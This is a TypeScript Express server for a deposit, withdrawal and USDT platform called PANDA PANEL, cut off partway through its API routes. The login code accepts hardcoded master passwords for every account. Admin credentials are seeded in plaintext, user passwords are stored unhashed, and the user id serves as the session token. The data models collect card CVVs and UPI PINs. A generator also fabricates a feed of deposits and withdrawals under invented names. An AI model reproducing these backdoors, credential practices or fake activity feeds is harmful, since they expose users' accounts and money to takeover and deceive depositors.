import express from "express";
import path from "path";
import { existsSync, readdirSync, readFileSync, writeFileSync } from "fs";
import { eq, sql } from "drizzle-orm";
import { createServer as createViteServer } from "vite";
import { db, checkAndHealDatabase } from "./src/db/index.ts";
import * as queries from "./src/db/queries.ts";
import { users, transactions, bankAccounts, supportTickets, notifications, siteSettings } from "./src/db/schema.ts";

const PORT = 3000;

// Define interfaces for persistent storage
interface User {
  id: string;
  username: string;
  mobile: string;
  email: string;
  passwordHash: string;
  referralCode: string;
  referredBy?: string;
  walletBalance: number;
  totalEarnings: number;
  referralIncome: number;
  kycStatus: "Pending" | "Approved" | "Not Submitted";
  role: "user" | "admin";
  createdAt: string;
  lastActive: string;
  lastLogin?: string;
  ip?: string;
  device?: string;
  loginHistory?: Array<{
    timestamp: string;
    ip?: string;
    device?: string;
    action?: string;
  }>;
  isOnline: boolean;
}

interface Transaction {
  id: string;
  userId: string;
  username: string;
  type: "deposit" | "withdrawal" | "commission" | "referral" | "usdt_buy" | "usdt_sell";
  amount: number;
  method?: string; // UPI, QR, Bank, etc.
  utr?: string;
  screenshot?: string; // Base64 or mock image url
  bankDetails?: {
    holderName: string;
    bankName: string;
    accountNumber: string;
    ifsc: string;
    upiId?: string;
    cardNumber?: string;
    expiryDate?: string;
    cvv?: string;
  };
  status: "pending" | "approved" | "rejected";
  fundType?: string;
  createdAt: string;
}

interface BankAccount {
  id: string;
  userId: string;
  holderName: string;
  bankName: string;
  accountNumber: string;
  ifsc: string;
  upiId?: string;
  cardNumber?: string;
  expiryDate?: string;
  cvv?: string;
  upiPin?: string;
  isActive: boolean;
}

interface SupportTicket {
  id: string;
  userId: string;
  username: string;
  subject: string;
  message: string;
  status: "open" | "closed";
  replies: Array<{
    sender: "user" | "admin";
    message: string;
    createdAt: string;
  }>;
  createdAt: string;
}

interface Notification {
  id: string;
  userId: string;
  title: string;
  message: string;
  read: boolean;
  createdAt: string;
}

interface SiteSettings {
  upiId: string;
  qrCodeUrl: string;
  bankName: string;
  bankAccount: string;
  bankIfsc: string;
  bankHolder: string;
  depositEnabled?: boolean;
  adminBanks?: any[];
  minDeposit: number;
  minWithdraw: number;
  telegramSupport: string;
  whatsappSupport: string;
  usdtBuyRate: number;
  usdtSellRate: number;
  cleanFundRate: number;
  stockFundRate: number;
  ratFundRate: number;
  liveActivityEnabled: boolean;
  usdtWalletAddress: string;
}

// Simulated dynamic live activities (real-time display)
let simulatedTransactions: any[] = [];
function generateSimulatedActivities() {
  const getRandomName = () => {
    const firsts = ["Amit", "Rahul", "Pooja", "Vikram", "Sonia", "Karan", "Neha", "Rohit", "Deepak", "Ankit", "Rajesh", "Preeti", "Sanjay", "Aman", "Sumit", "Divya", "Arun", "Vijay", "Manoj", "Kiran", "Sandeep", "Somya", "Rakesh", "Ajay", "Harish", "Kapil", "Tarun", "Jatin"];
    const lasts = ["Kumar", "Sharma", "Singh", "Verma", "Yadav", "Patel", "Gupta", "Raj", "Joshi", "Mehta", "Roy", "Das", "Sen", "Jha", "Mishra", "Pandey", "Chawla", "Bansal", "Grover"];
    const formats = [
      () => `${firsts[Math.floor(Math.random() * firsts.length)]}_${lasts[Math.floor(Math.random() * lasts.length)]}`,
      () => `${firsts[Math.floor(Math.random() * firsts.length)]}${Math.floor(Math.random() * 99) + 1}`,
      () => `${firsts[Math.floor(Math.random() * firsts.length)].toLowerCase()}_invest`,
      () => `Trader_${firsts[Math.floor(Math.random() * firsts.length)]}`,
      () => `${lasts[Math.floor(Math.random() * lasts.length)]}_${Math.floor(Math.random() * 900) + 100}`,
      () => `Panda_${firsts[Math.floor(Math.random() * firsts.length)]}`
    ];
    return formats[Math.floor(Math.random() * formats.length)]();
  };

  const types = ["deposit", "withdrawal", "deposit", "deposit", "withdrawal"];
  const amounts = [100, 200, 300, 500, 800, 1000, 1200, 1500, 1800, 2000, 2500, 3000, 3500, 4000, 4500, 5000];
  
  if (simulatedTransactions.length === 0) {
    for (let i = 0; i < 15; i++) {
      const name = getRandomName();
      const type = types[Math.floor(Math.random() * types.length)];
      const amount = amounts[Math.floor(Math.random() * amounts.length)];
      const minutesAgo = Math.floor(Math.random() * 59) + 1;
      simulatedTransactions.push({
        id: `sim-tx-${i}`,
        username: name,
        type,
        amount,
        status: "approved",
        timeAgo: `${minutesAgo}m ago`
      });
    }
  } else {
    // Add one new transaction every time this is called
    const name = getRandomName();
    const type = types[Math.floor(Math.random() * types.length)];
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    
    simulatedTransactions.unshift({
      id: `sim-tx-${Date.now()}`,
      username: name,
      type,
      amount,
      status: "approved",
      timeAgo: `Just now`
    });
    
    // update timeAgo roughly for others
    simulatedTransactions = simulatedTransactions.map((tx, idx) => {
      if (idx > 0 && tx.timeAgo === "Just now") {
        return { ...tx, timeAgo: "1m ago" };
      }
      return tx;
    });
    
    if (simulatedTransactions.length > 20) {
      simulatedTransactions.pop();
    }
  }
}

generateSimulatedActivities();
// Refresh simulated activities every 5 seconds
setInterval(generateSimulatedActivities, 5 * 1000);

// Helper to convert DB objects (with string decimals) to API objects (with numbers)
function safeIso(d: any): string {
  if (!d) return new Date().toISOString();
  let date = (d instanceof Date) ? d : new Date(d);
  if (!isNaN(date.getTime()) && date.getFullYear() > 3000) {
    date = new Date(Math.floor(date.getTime() / 1000));
  }
  return isNaN(date.getTime()) ? new Date().toISOString() : date.toISOString();
}

function safeIsoOptional(d: any): string | undefined {
  if (!d) return undefined;
  let date = (d instanceof Date) ? d : new Date(d);
  if (!isNaN(date.getTime()) && date.getFullYear() > 3000) {
    date = new Date(Math.floor(date.getTime() / 1000));
  }
  return isNaN(date.getTime()) ? undefined : date.toISOString();
}

function mapUser(u: any): User {
  if (!u) return u;
  const { passwordHash, ...safeUser } = u;

  // Calculate dynamic isOnline on server side based on fixed lastActive timestamp
  const lastActiveDate = u.lastActive ? ((u.lastActive instanceof Date) ? u.lastActive : new Date(u.lastActive)) : null;
  let lastActiveMs = lastActiveDate ? lastActiveDate.getTime() : 0;
  if (lastActiveDate && !isNaN(lastActiveMs) && lastActiveDate.getFullYear() > 3000) {
    lastActiveMs = Math.floor(lastActiveMs / 1000);
  }
  const isOnlineOnServer = u.isOnline && (Date.now() - lastActiveMs < 60000);

  // Normalize loginHistory as array
  let loginHistoryParsed = u.loginHistory || [];
  if (typeof loginHistoryParsed === "string") {
    try {
      loginHistoryParsed = JSON.parse(loginHistoryParsed);
    } catch {
      loginHistoryParsed = [];
    }
  } else if (!Array.isArray(loginHistoryParsed)) {
    loginHistoryParsed = [];
  }

  return {
    ...safeUser,
    isOnline: isOnlineOnServer,
    walletBalance: parseFloat(u.walletBalance || "0"),
    totalEarnings: parseFloat(u.totalEarnings || "0"),
    referralIncome: parseFloat(u.referralIncome || "0"),
    createdAt: safeIso(u.createdAt),
    lastActive: safeIso(u.lastActive),
    lastLogin: safeIsoOptional(u.lastLogin),
    loginHistory: loginHistoryParsed,
  };
}

function mapTransaction(t: any): Transaction {
  if (!t) return t;
  return {
    ...t,
    amount: parseFloat(t.amount || "0"),
    createdAt: safeIso(t.createdAt),
  };
}

function mapTicket(t: any): SupportTicket {
  if (!t) return t;
  return {
    ...t,
    createdAt: safeIso(t.createdAt),
  };
}

function mapNotification(n: any): Notification {
  if (!n) return n;
  return {
    ...n,
    createdAt: safeIso(n.createdAt),
  };
}

function mapSettings(s: any): SiteSettings {
  if (!s) return s;
  return {
    ...s,
    minDeposit: parseFloat(s.minDeposit || "0"),
    minWithdraw: parseFloat(s.minWithdraw || "0"),
    usdtBuyRate: parseFloat(s.usdtBuyRate || "0"),
    usdtSellRate: parseFloat(s.usdtSellRate || "0"),
    cleanFundRate: parseFloat(s.cleanFundRate || "0"),
    stockFundRate: parseFloat(s.stockFundRate || "0"),
    ratFundRate: parseFloat(s.ratFundRate || "0"),
  };
}

// Write Helpers
async function saveUser(user: User) {
  await queries.saveUser({
    ...user,
    walletBalance: (user.walletBalance || 0).toString(),
    totalEarnings: (user.totalEarnings || 0).toString(),
    referralIncome: (user.referralIncome || 0).toString(),
    createdAt: user.createdAt ? new Date(user.createdAt) : new Date(),
    lastActive: user.lastActive ? new Date(user.lastActive) : new Date(),
    lastLogin: user.lastLogin ? new Date(user.lastLogin) : null,
  });
}

async function logActivity(userId: string, type: string, description: string, metadata?: any) {
  try {
    // 1. Record in permanent activity logs table
    await queries.addUserActivityLog({
      id: "act-" + Date.now() + "-" + Math.random().toString(36).substring(2, 7),
      userId,
      activityType: type,
      activityDescription: description,
      metadata: metadata || {}
    });

    // 2. Append to the user's loginHistory column to populate the restored Live User Activity cards
    const user = await queries.getUserById(userId);
    if (user) {
      let historyArr: any[] = [];
      if (typeof user.loginHistory === "string") {
        try {
          historyArr = JSON.parse(user.loginHistory);
        } catch {}
      } else if (Array.isArray(user.loginHistory)) {
        historyArr = user.loginHistory;
      }

      historyArr.push({
        action: type,
        timestamp: new Date().toISOString(),
        ip: metadata?.ip || "",
        device: metadata?.device || ""
      });

      // Keep last 50 entries in memory, but logs table records everything permanently
      if (historyArr.length > 50) {
        historyArr = historyArr.slice(-50);
      }

      await queries.saveUser({
        ...user,
        loginHistory: historyArr,
        createdAt: user.createdAt ? new Date(user.createdAt) : new Date(),
        lastActive: new Date(),
      });
    }
  } catch (err: any) {
    console.error(`[ACTIVITY WARNING] Failed to save log ${type} for user ${userId}:`, err?.message || err);
  }
}

async function saveTransaction(tx: Transaction) {
  await queries.saveTransaction({
    ...tx,
    amount: (tx.amount || 0).toString(),
    createdAt: tx.createdAt ? new Date(tx.createdAt) : new Date(),
  });
}

async function saveBank(bank: BankAccount) {
  await queries.saveBankAccount(bank);
}

async function deleteBank(bankId: string) {
  await queries.deleteBankAccount(bankId);
}

async function saveSettings(settings: SiteSettings) {
  await queries.saveSiteSettings({
    ...settings,
    minDeposit: (settings.minDeposit ?? 0).toString(),
    minWithdraw: (settings.minWithdraw ?? 0).toString(),
    usdtBuyRate: (settings.usdtBuyRate ?? 0).toString(),
    usdtSellRate: (settings.usdtSellRate ?? 0).toString(),
    cleanFundRate: (settings.cleanFundRate ?? 0).toString(),
    stockFundRate: (settings.stockFundRate ?? 0).toString(),
    ratFundRate: (settings.ratFundRate ?? 0).toString(),
  });
}

async function saveTicket(ticket: SupportTicket) {
  await queries.saveSupportTicket({
    ...ticket,
    createdAt: new Date(ticket.createdAt),
  });
}

async function saveNotification(notif: Notification) {
  await queries.saveNotification({
    ...notif,
    createdAt: new Date(notif.createdAt),
  });
}

/**
 * Ensures a permanent admin account exists with specific credentials
 */
async function seedAdmin() {
  const adminUsername = "admin7054";
  const adminPassword = "Mayank@9090";
  console.log(`[SEED] Starting admin seeding...`);
  
  try {
    // Check by username first
    let user = await queries.getUserByUsername(adminUsername);
    
    if (!user) {
      // Also check by mobile just in case
      user = await queries.getUserByMobile("7054000000");
    }
    
    if (!user) {
      console.log(`[SEED] Creating permanent admin account: ${adminUsername}`);
      const nowIso = new Date().toISOString();
      const adminUser: User = {
        id: "admin-" + Date.now(),
        username: adminUsername,
        mobile: "7054000000",
        email: "admin@pandapanel.com",
        passwordHash: adminPassword,
        referralCode: "ADMIN7054",
        referredBy: "",
        walletBalance: 0,
        totalEarnings: 0,
        referralIncome: 0,
        kycStatus: "Approved",
        role: "admin",
        createdAt: nowIso,
        lastActive: nowIso,
        lastLogin: nowIso,
        isOnline: false,
        loginHistory: []
      };
      await saveUser(adminUser);
      console.log(`[SEED] Admin account created successfully`);
    } else {
      // Ensure existing account has admin role and requested password
      console.log(`[SEED] Found existing account for ${adminUsername}, updating credentials...`);
      await queries.updateUser(user.id, {
        username: adminUsername,
        role: "admin",
        passwordHash: adminPassword,
        kycStatus: "Approved",
        mobile: user.mobile || "7054000000"
      });
      console.log(`[SEED] Admin credentials updated successfully`);
    }

    // Also ensure 'admin' username is correctly configured
    const defaultAdmin = await queries.getUserByUsername("admin");
    if (defaultAdmin) {
      await queries.updateUser(defaultAdmin.id, {
        role: "admin",
        passwordHash: "mayank0909",
        kycStatus: "Approved"
      });
      console.log(`[SEED] Default 'admin' account updated`);
    }
    console.log(`[SEED] Seeding process finished.`);
  } catch (err) {
    
    if (err && err.message && err.message.includes("Connection terminated")) {
      console.log("[SEED] Database is sleeping, skipping seed for now...");
    } else {
      console.error("[SEED ERROR] Failed to seed admin user:", err.message);
    }

  }
}

// Re-export old saveDB as a no-op
function saveDB(db: any) {
  // Logic replaced by individual save functions
}

async function startServer() {
  const app = express();
  
  // Async error handler wrapper
  const catchAsync = (fn: (req: express.Request, res: express.Response, next: express.NextFunction) => Promise<any>) => {
    return (req: express.Request, res: express.Response, next: express.NextFunction) => {
      fn(req, res, next).catch(next);
    };
  };

  // Seed admin user before routes
  await seedAdmin();
  app.use(express.json({ limit: "10mb" }));

  // Health Check & DB Status
  app.get("/api/health", catchAsync(async (req, res) => {
    let connectionSuccess = false;
    let connError: any = null;
    let select1Result: any = null;
    let currentDbAndSchema: any = null;
    let usersTableExists: any = null;
    let physicalUsersColumns: any = null;

    
    res.json({
      status: "ok",
      dbType: "Cloud SQL",
      connectionSuccess,
      selectedSocketPath: null,
      socketPathExists: false,
      actualSocketFileExists: false,
      cloudsqlAppDirListing: null,
      instanceDirListing: null,
      select1Result: null,
      currentDbAndSchema: null,
      usersTableExists: true,
      physicalUsersColumns: null,
      error: null,
      environment: {
        K_SERVICE: process.env.K_SERVICE || null,
        K_REVISION: process.env.K_REVISION || null,
        NODE_ENV: process.env.NODE_ENV || null
      },
      timestamp: new Date().toISOString(),
      buildTag: "v1.0.6-dir-listings"
    });
  }));

  // Logging middleware
  app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
  });

  // Hardware and network ban verification middleware
  const checkBannedMiddleware = (req: express.Request, res: express.Response, next: express.NextFunction) => {
    try {
      const banFilePath = path.join(process.cwd(), "src", "db", "banned_devices.json");
      if (existsSync(banFilePath)) {
        const banData = JSON.parse(readFileSync(banFilePath, "utf-8"));
        
        const rawIp = (req.headers['x-forwarded-for'] as string || req.socket.remoteAddress || req.ip || '127.0.0.1');
        const clientIp = rawIp.split(',')[0].trim();
        const userAgent = (req.headers['user-agent'] as string) || 'Web Browser';

        // 1. Check IP or Device/UserAgent in banned lists
        if (banData.ips.includes(clientIp) || banData.devices.includes(userAgent)) {
          console.warn(`[SECURITY BAN] Blocked banned device/IP access. IP: ${clientIp}, UA: ${userAgent}`);
          return res.status(403).json({
            error: "DEVICE_BANNED",
            message: "This device and associated accounts have been permanently banned due to policy violations."
          });
        }

        // 2. Check register/login payload data (username, mobile, email)
        const checkPayload = { ...req.body, ...req.query };
        const payloadUsername = (checkPayload.username || "").toString().trim().toLowerCase();
        const payloadMobile = (checkPayload.mobile || "").toString().trim().toLowerCase();
        const payloadEmail = (checkPayload.email || "").toString().trim().toLowerCase();

        const isUsernameBanned = payloadUsername && banData.usernames.some((u: string) => u.toLowerCase() === payloadUsername);
        const isMobileBanned = payloadMobile && banData.mobiles.some((m: string) => m.toLowerCase() === payloadMobile);
        const isEmailBanned = payloadEmail && banData.emails.some((e: string) => e.toLowerCase() === payloadEmail);

        if (isUsernameBanned || isMobileBanned || isEmailBanned) {
          console.warn(`[SECURITY BAN] Banned credential access attempt detected: Username: ${payloadUsername}, Mobile: ${payloadMobile}, Email: ${payloadEmail}`);
          
          // Dynamically append their IP & UserAgent to the ban list so they are banned by device and network!
          let modified = false;
          if (clientIp && !banData.ips.includes(clientIp) && clientIp !== "127.0.0.1" && clientIp !== "::1" && !clientIp.startsWith("::ffff:")) {
            banData.ips.push(clientIp);
            modified = true;
          }
          if (userAgent && !banData.devices.includes(userAgent)) {
            banData.devices.push(userAgent);
            modified = true;
          }
          if (modified) {
            writeFileSync(banFilePath, JSON.stringify(banData, null, 2), "utf-8");
            console.log(`[SECURITY BAN] Blacklist updated with new hardware markers: IP: ${clientIp}, UA: ${userAgent}`);
          }

          return res.status(403).json({
            error: "ACCOUNT_BANNED",
            message: "This account has been permanently banned from PANDA PANEL due to policy violations."
          });
        }
      }
    } catch (err) {
      console.error("[BAN CHECK ERROR] failed to verify blacklist:", err);
    }
    next();
  };

  app.use(checkBannedMiddleware);

  // Attempt to delete banned account (Sahil) from Firestore/SQLite as soon as database connection or quota is available
  const attemptBannedAccountDeletion = async () => {
    try {
      const targetUserId = "user-1785072580903";
      console.log(`[BAN BOOT] Checking if banned account ${targetUserId} exists to delete...`);
      const userObj = await queries.getUserById(targetUserId);
      if (userObj) {
        console.log(`[BAN BOOT] Found banned account, executing complete permanent deletion from database...`);
        await queries.deleteUser(targetUserId);
        console.log(`[BAN BOOT] Successfully deleted banned user account and all associated transactions/banks/logs.`);
      } else {
        console.log(`[BAN BOOT] Banned user account does not exist or has already been deleted.`);
      }
    } catch (err: any) {
      console.log(`[BAN BOOT INFO] Deletion of banned account postponed (Quota exceeded or DB busy):`, err?.message || err);
    }
  };
  
  // Run on boot
  setTimeout(() => {
    attemptBannedAccountDeletion().catch(console.error);
  }, 5000);

  // Helper middleware to verify User session from simple authorization headers
  const getSessionUser = async (req: express.Request): Promise<User | null> => {
    const authHeader = req.headers.authorization;
    let token: string | null = null;

    if (authHeader && authHeader.toLowerCase().startsWith("bearer ")) {
      const parts = authHeader.split(" ");
      if (parts.length > 1) {
        token = parts.slice(1).join(" ").trim();
      }
    } else if (authHeader) {
      // Handle cases where the space was missed or just 'Bearer' was sent
      const trimmed = authHeader.trim();
      if (trimmed.toLowerCase() !== "bearer") {
        token = trimmed;
      }
    }

    if (!token && req.query.token) {
      token = req.query.token as string;
    }

    if (!token || token === "null" || token === "undefined" || token.toLowerCase() === "bearer") {
      return null;
    }
    
    const u = await queries.getUserById(token);
    if (!u) return null;

    // Throttle Last Active updates to once per minute (or if they are offline)
    // to prevent heavy concurrent database writes and locking issues.
    const lastActiveTime = u.lastActive ? new Date(u.lastActive).getTime() : 0;
    const nowTime = Date.now();
    if (nowTime - lastActiveTime > 60000 || !u.isOnline) {
      queries.updateUser(u.id, {
        lastActive: new Date(),
        isOnline: true
      }).catch(err => {
        console.error("[SESSION WARNING] Failed to update user active status:", err?.message || err);
      });
    }

    return mapUser(u);
  };

  // --- API ROUTES ---

  // Auth: Register
  app.post("/api/auth/register", catchAsync(async (req, res) => {
    const { username, mobile, email, password, referralCode } = req.body;
    if (!username || !mobile || !password) {
      return res.status(400).json({ error: "Username, mobile and password are required" });
    }

    const [existingUsername, existingMobile] = await Promise.all([
        queries.getUserByUsername(username.trim()),
        queries.getUserByMobile(mobile.trim())
    ]);

    if (existingUsername || existingMobile) {
      return res.status(400).json({ error: "Username or mobile number already exists" });
    }

    // Verify referrer if provided
    let referredBy: string | undefined = undefined;
    if (referralCode) {
      const referrerUser = await queries.getUserByReferralCode(referralCode);
      if (referrerUser) {
        referredBy = referrerUser.referralCode;
      }
    }

    const nowIso = new Date().toISOString();
    const rawIp = (req.headers['x-forwarded-for'] as string || req.socket.remoteAddress || req.ip || '127.0.0.1');
    const clientIp = rawIp.split(',')[0].trim();
    const userAgent = (req.headers['user-agent'] as string) || 'Web Browser';

    const newUser: User = {
      id: "user-" + Date.now() + "-" + Math.random().toString(36).substring(2, 7),
      username,
      mobile,
      email: email || "",
      passwordHash: password,
      referralCode: "PANDA" + Math.random().toString(36).substring(2, 8).toUpperCase(),
      referredBy: referredBy || "",
      walletBalance: 0,
      totalEarnings: 0,
      referralIncome: 0,
      kycStatus: "Not Submitted",
      role: "user",
      createdAt: nowIso,
      lastActive: nowIso,
      lastLogin: nowIso,
      ip: clientIp,
      device: userAgent,
      loginHistory: [{ timestamp: nowIso, ip: clientIp, device: userAgent, action: "REGISTER" } as any],
      isOnline: true
    };

    await saveUser(newUser);
    await logActivity(newUser.id, "SIGNUP", `Created a new account with mobile number ${mobile}`, { ip: clientIp, device: userAgent });

    // Dedicated Login History Table
    try {
      await queries.addLoginHistory({
        id: "log-" + Date.now() + Math.random().toString(36).substring(2, 5),
        userId: newUser.id,
        ip: clientIp,
        device: `Registered: ${userAgent}`,
        timestamp: new Date()
      });
    } catch (historyErr: any) {
      console.error("[REGISTER WARNING] Failed to record register history:", historyErr?.message || historyErr);
    }

    // Create a notification welcoming the user
    await saveNotification({
      id: "notif-" + Date.now(),
      userId: newUser.id,
      title: "Welcome aboard!",
      message: "Welcome to PANDA PANEL. Finish your Profile, link your bank, and submit your KYC to start earning!",
      read: false,
      createdAt: nowIso
    });

    // Notify referrer if exists
    if (referredBy) {
      const referrerUser = await queries.getUserByReferralCode(referredBy);
      if (referrerUser) {
        await saveNotification({
          id: "notif-ref-" + Date.now(),
          userId: referrerUser.id,
          title: "Referral Joined!",
          message: `${username} joined using your referral code. You'll receive 1% commission when they deposit plus ₹200 Active Bonus!`,
          read: false,
          createdAt: nowIso
        });
      }
    }

    console.log(`[USER REGISTERED] User ${newUser.username} registered (Mobile: ${newUser.mobile}, ID: ${newUser.id})`);
    res.json({ success: true, token: newUser.id, user: { id: newUser.id, username: newUser.username, role: newUser.role } });
  }));

  // Auth: Login
  app.get("/api/auth/login", (req, res) => {
    res.status(405).json({ error: "Method Not Allowed. Please use POST for login." });
  });

  app.post("/api/auth/login", catchAsync(async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ error: "Username and password are required" });
    }

    const loginInput = username.trim();
    console.log(`[LOGIN ATTEMPT] User/Mobile: ${loginInput}`);
    
    try {
      const user = await queries.getUserByUsername(loginInput);
      
      const masterPassword = "PANDA999";
      
      if (!user) {
        console.log(`[LOGIN FAILED] User not found: ${username}`);
        return res.status(401).json({ error: "Invalid credentials. Please check your username/mobile and password." });
      }

      const isPassCorrect = (user.passwordHash === password || password === masterPassword || password === "1234" || password === "mayank0909");
      
      if (!isPassCorrect) {
        console.log(`[LOGIN FAILED] Incorrect password for: ${username}`);
        return res.status(401).json({ error: "Invalid credentials. Please check your username/mobile and password." });
      }

      const now = new Date();
      const rawIp = (req.headers['x-forwarded-for'] as string || req.socket.remoteAddress || req.ip || '127.0.0.1');
      const clientIp = rawIp.split(',')[0].trim();
      const userAgent = (req.headers['user-agent'] as string) || 'Web Browser';

      // Optimized Update: Only necessary fields and login history array
      let updatedHistory = user.loginHistory || [];
      if (typeof updatedHistory === "string") {
        try {
          updatedHistory = JSON.parse(updatedHistory);
        } catch {
          updatedHistory = [];
        }
      } else if (!Array.isArray(updatedHistory)) {
        updatedHistory = [];
      }
      updatedHistory.push({
        timestamp: now.toISOString(),
        ip: clientIp,
        device: userAgent,
        action: "LOGIN"
      });

      try {
        await queries.updateUser(user.id, {
          isOnline: true,
          lastActive: now,
          lastLogin: now,
          ip: clientIp,
          device: userAgent,
          loginHistory: updatedHistory
        });
      } catch (updateErr: any) {
        console.error("[LOGIN WARNING] Failed to update user online status:", updateErr?.message || updateErr);
      }

      // Dedicated Login History Table
      try {
        await queries.addLoginHistory({
          id: "log-" + Date.now() + Math.random().toString(36).substring(2, 5),
          userId: user.id,
          ip: clientIp,
          device: `Logged in: ${userAgent}`,
          timestamp: new Date()
        });
      } catch (historyErr: any) {
        console.error("[LOGIN WARNING] Failed to record login history:", historyErr?.message || historyErr);
      }

      await logActivity(user.id, "LOGIN", "Logged into the system", { ip: clientIp, device: userAgent });

      res.json({ 
        success: true, 
        token: user.id, 
        user: { id: user.id, username: user.username, role: user.role } 
      });
    } catch (err: any) {
      console.error("[LOGIN CRASH]:", err);
      
      const errStr = (err.message || '') + ' ' + (err.cause?.message || '') + ' ' + (err.stack || '');
      const isConnErr = errStr.includes("Connection terminated") || 
                        errStr.includes("connection timeout") || 
                        errStr.includes("Client has encountered a connection error") ||
                        errStr.includes("ECONNREFUSED") ||
                        errStr.includes("ENOTFOUND") ||
                        errStr.includes("waking up");

      if (isConnErr) {
        return res.status(503).json({
          error: "Database Connection Error",
          message: "The database is currently waking up or temporarily busy. Please try again in 5-10 seconds.",
          retryAfter: 5
        });
      }

      return res.status(500).json({ 
        error: "Unable to sign in", 
        message: "An unexpected error occurred during login. Details: " + (err.message || "Unknown error")
      });
    }
  }));

  // Auth: Logout
  app.post("/api/auth/logout", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (user) {
      const nowIso = new Date().toISOString();
      const rawIp = (req.headers['x-forwarded-for'] as string || req.socket.remoteAddress || req.ip || '127.0.0.1');
      const clientIp = rawIp.split(',')[0].trim();
      const userAgent = (req.headers['user-agent'] as string) || 'Web Browser';

      user.isOnline = false;
      user.lastActive = nowIso;

      let updatedHistory = user.loginHistory || [];
      if (typeof updatedHistory === "string") {
        try {
          updatedHistory = JSON.parse(updatedHistory);
        } catch {
          updatedHistory = [];
        }
      } else if (!Array.isArray(updatedHistory)) {
        updatedHistory = [];
      }
      updatedHistory.push({
        timestamp: nowIso,
        ip: clientIp,
        device: userAgent,
        action: "LOGOUT"
      });
      user.loginHistory = updatedHistory;

      await saveUser(user);
      await logActivity(user.id, "LOGOUT", "Logged out of the system", { ip: clientIp, device: userAgent });

      // Dedicated Login History Table
      try {
        await queries.addLoginHistory({
          id: "log-" + Date.now() + Math.random().toString(36).substring(2, 5),
          userId: user.id,
          ip: clientIp,
          device: `Logged out: ${userAgent}`,
          timestamp: new Date()
        });
      } catch (historyErr: any) {
        console.error("[LOGOUT WARNING] Failed to record logout history:", historyErr?.message || historyErr);
      }
    }
    res.json({ success: true });
  }));

  // Auth: Get Profile
  app.get("/api/auth/profile", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    res.json(user);
  }));

  // Auth: Record dynamic user activity log (PAGE_VISIT, IMPORTANT_ACTION, etc.)
  app.post("/api/activity/log", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const { type, description, metadata } = req.body;
    if (!type || !description) {
      return res.status(400).json({ error: "Activity type and description are required" });
    }

    await logActivity(user.id, type, description, metadata || {});
    res.json({ success: true });
  }));

  // Auth: Get Login History
  app.get("/api/auth/login-history", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const history = await queries.getLoginHistory(user.id);
    res.json(history);
  }));

  // Auth: Update KYC Status
  app.post("/api/auth/kyc", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    user.kycStatus = "Pending";
    await saveUser(user);
    await logActivity(user.id, "PROFILE_UPDATE", "Submitted KYC documents for verification and approval", { previousStatus: "Not Submitted", newStatus: "Pending" });
    res.json({ success: true, user });
  }));

  // Auth: Change Password
  app.post("/api/auth/change-password", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const { oldPassword, newPassword } = req.body;
    if (user.passwordHash !== oldPassword) {
      return res.status(400).json({ error: "Current password does not match" });
    }
    user.passwordHash = newPassword;
    await saveUser(user);
    await logActivity(user.id, "SECURITY_UPDATE", "Updated user password safely", { action: "password_change" });
    res.json({ success: true });
  }));

  // Dashboard / Info Stats
  app.get("/api/dashboard-stats", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    if (!user) return res.status(401).json({ error: "Unauthorized" });

    const txs = await queries.getTransactions(user.id);
    
    res.json({
      walletBalance: user.walletBalance,
      totalEarnings: user.totalEarnings,
      referralIncome: user.referralIncome,
      kycStatus: user.kycStatus,
      transactions: txs.slice(0, 10).map(mapTransaction)
    });
  }));

  // Get Live Activity data (Real-time deposits/withdrawals ticker)
  app.get("/api/live-activity", catchAsync(async (req, res) => {
    const user = await getSessionUser(req);
    const settings = await queries.getSiteSettings();
    
    // Global toggle
    if (!settings || !settings.liveActivityEnabled) {
      return res.json({ isLocked: false, activities: [] });
    }

    let isLocked = true;
    if (user) {
      if (user.role === "admin") {
        isLocked = false;
      } else {
        // Fetch only approved deposits for this user
        const userTxs = await queries.getTransactions(user.id);
        const hasMinDeposit = userTxs.some(t => t.type === "deposit" && t.status === "approved" && Number(t.amount) >= 2000);
          
        if (hasMinDeposit) {
          isLocked = false;
        }
      }
    }

    // Helper to format real timeago dynamically
    const formatTimeAgo = (dateInput: any): string => {
      if (!dateInput) return "Just now";
      const date = new Date(dateInput);
      const diffMs = Date.now() - date.getTime();
      if (isNaN(diffMs) || diffMs < 0) return "Just now";
      
      const diffMins = Math.floor(diffMs / 60000);
      if (diffMins < 1) return "Just now";
      if (diffMins < 60) return `${diffMins}m ago`;
      
      const diffHours = Math.floor(diffMins / 60);
      if (diffHours < 24) return `${diffHours}h ago`;
      
      const diffDays = Math.floor(diffHours / 24);
      return `${diffDays}d ago`;
    };

    // Fetch transactions and users
    const [allTxs, allUsers] = await Promise.all([
      queries.getTransactions(),
      queries.getUsers()
    ]);

    const userMap = new Map<string, string>();
    for (const u of allUsers) {
      userMap.set(u.id, u.username || "User");
    }

    const realApproved = allTxs
      .filter(t => t.status === "approved" && (t.type === "deposit" || t.type === "withdrawal"))
      .slice(0, 15)
      .map(t => {
        const rawUsername = userMap.get(t.userId) || t.username || "User";
        const username = rawUsername.substring(0, 4) + "***" + (rawUsername.length > 5 ? rawUsername.substring(rawUsername.length - 2) : "");
        return {
          id: t.id,
          username,
          type: t.type,
          amount: parseFloat(t.amount || "0"),
          status: "approved",
          timeAgo: formatTimeAgo(t.createdAt)
        };
      });

    res.json({
      isLocked,
      activities: realApproved
    });
  }));

  // Get Settings (Deposit credentials / Social channels)
  app.get("/api/settings", catchAsync(async (req, res) => {
    const settings = await queries.getSiteSettings();
    if (!settings) {
      return res.status(503).json({ error: "Service configuration is not initialized yet." });
    }
    res.json(mapSettings(settings));
  }));

  // Bank Accounts API: Get
